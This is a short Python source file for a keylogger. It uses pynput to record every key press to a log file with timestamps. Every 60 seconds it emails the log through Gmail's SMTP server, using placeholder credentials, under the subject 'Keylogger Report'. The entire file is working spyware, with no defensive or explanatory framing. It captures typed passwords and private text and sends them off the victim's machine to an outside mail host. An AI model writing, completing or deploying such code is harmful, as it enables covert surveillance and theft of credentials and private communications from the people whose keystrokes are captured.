from pynput.keyboard import Key, Listener
import logging
import smtplib
import sys
import time

# Set up logging
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

# Set up email
email_sender = "your_email@example.com"
email_password = "your_email_password"
email_receiver = "recipient_email@example.com"

def send_email(message):
    # Send email with the keylog
    try:
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(email_sender, email_password)
        msg = "Subject: Keylogger Report\n\n" + message
        server.sendmail(email_sender, email_receiver, msg)
        server.quit()
    except:
        logging.critical("Error sending email")

def on_press(key):
    # Log key press and check if it's time to send email
    logging.info(str(key))
    global start_time
    current_time = time.time()
    if current_time - start_time > 60:
        # Send email if it's been 60 seconds since the last email
        send_email(open("keylog.txt").read())
        start_time = current_time

# Start the keylogger
start_time = time.time()
with Listener(on_press=on_press) as listener:
    listener.join()